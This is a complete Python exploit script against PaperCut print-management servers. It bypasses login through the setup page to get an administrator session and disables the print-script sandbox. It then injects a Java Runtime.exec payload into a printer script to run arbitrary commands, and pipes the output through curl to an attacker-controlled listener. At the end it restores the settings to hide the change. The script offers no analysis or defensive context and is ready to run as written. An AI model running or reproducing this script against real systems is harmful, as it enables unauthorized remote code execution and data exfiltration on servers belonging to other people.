#!/usr/bin/python3
import argparse
import requests
import subprocess
import urllib.parse

def get_session_id(base_url):
    s = requests.Session()
    r = s.get(f'{base_url}/app?service=page/SetupCompleted', verify=False)

    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'direct/1/SetupCompleted/$Form',
        'sp': 'S0',
        'Form0': '$Hidden,analyticsEnabled,$Submit',
        '$Hidden': 'true',
        '$Submit': 'Login'
    }
    r = s.post(f'{base_url}/app', data=data, headers=headers, verify=False)
    if r.status_code == 200 and b'papercut' in r.content and 'JSESSIONID' in r.headers.get('Set-Cookie', ''):
        print(f'[*] Papercut instance is vulnerable! Obtained valid JSESSIONID')
        return s
    else:
        print(f'[-] Failed to get valid response, likely not vulnerable')
        return None

def set_setting(base_url, session, setting, enabled):
    print(f'[*] Updating {setting} to {enabled}')
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'direct/1/ConfigEditor/quickFindForm',
        'sp': 'S0',
        'Form0': '$TextField,doQuickFind,clear',
        '$TextField': setting,
        'doQuickFind': 'Go'
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/ConfigEditor/$Form',
        'sp': 'S1',
        'Form1': '$TextField$0,$Submit,$Submit$0',
        '$TextField$0': enabled,
        '$Submit': 'Update'
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)

def execute(base_url, session, command_to_inject, lhost, lport):
    print('[*] Prepparing to execute: {command_to_inject}')
    payload = f"java.lang.Runtime.getRuntime().exec('{command_to_inject}');"
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'page/PrinterList'
    }
    r = session.get(f'{base_url}/app?service=page/PrinterList', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/PrinterList/selectPrinter',
        'sp': 'l1001'
    }
    r = session.get(f'{base_url}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/PrinterDetails/printerOptionsTab.tab',
        'sp': '4'
    }
    r = session.get(f'{base_url}/app', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
        'sp': 'S0',
        'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
        'printerId': 'l1001',
        'enablePrintScript': 'on',
        'scriptBody': "function printJobHook(inputs, actions) {}\r\n" \
                            f"{payload}",
        '$Submit$1': 'Apply',
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
    if r.status_code == 200 and 'Saved successfully' in r.text:
        print(f'[+] Command execution initiated on target.')
    else:
        print('[-] Might not have a printer configured. Exploit manually by adding one.')

def execute_and_send_result(base_url, session, command_to_list, lhost, lport):
    print(f'[*] Executing on target and sending result: {command_to_list}')
    payload = f"java.lang.Runtime.getRuntime().exec('curl \"http://{lhost}:{lport}?result=$( {command_to_list} )\"');"
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'page/PrinterList'
    }
    r = session.get(f'{base_url}/app?service=page/PrinterList', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/PrinterList/selectPrinter',
        'sp': 'l1001'
    }
    r = session.get(f'{base_url}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/PrinterDetails/printerOptionsTab.tab',
        'sp': '4'
    }
    r = session.get(f'{base_url}/app', data=data, headers=headers, verify=False)

    data = {
        'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
        'sp': 'S0',
        'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
        'printerId': 'l1001',
        'enablePrintScript': 'on',
        'scriptBody': "function printJobHook(inputs, actions) {}\r\n" \
                            f"{payload}",
        '$Submit$1': 'Apply',
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
    if r.status_code == 200 and 'Saved successfully' in r.text:
        print(f'[+] Command execution initiated on target. Check your listener at http://{lhost}:{lport}')
    else:
        print('[-] Might not have a printer configured. Exploit manually by adding one.')

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='The URL of the Papercut target application', required=True)
    parser.add_argument('-c', '--command', help='The command to execute directly', required=False)
    parser.add_argument('--list_command', help='The command to execute for listing and send result', required=False)
    parser.add_argument('--lhost', help='Your Kali Linux IP address for receiving results', required=False)
    parser.add_argument('--lport', type=int, help='Your listening port for receiving results', required=False)
    args = parser.parse_args()

    sess = get_session_id(args.url)
    if sess:
        set_setting(args.url, sess, setting='print-and-device.script.enabled', enabled='Y')
        set_setting(args.url, sess, setting='print.script.sandboxed', enabled='N')

        if args.command and args.lhost and args.lport:
            execute(args.url, sess, f"{args.command} | curl http://{args.lhost}:{args.lport}", args.lhost, args.lport)
        elif args.command:
            execute(args.url, sess, args.command, "", "") # lhost, lport가 없으면 직접 실행만 시도
        elif args.list_command and args.lhost and args.lport:
            execute_and_send_result(args.url, sess, args.list_command, args.lhost, args.lport)
        elif args.list_command and (not args.lhost or not args.lport):
            print("[-] --lhost and --lport are required when using --list_command")

        set_setting(args.url, sess, setting='print-and-device.script.enabled', enabled='N')
        set_setting(args.url, sess, setting='print.script.sandboxed', enabled='Y')
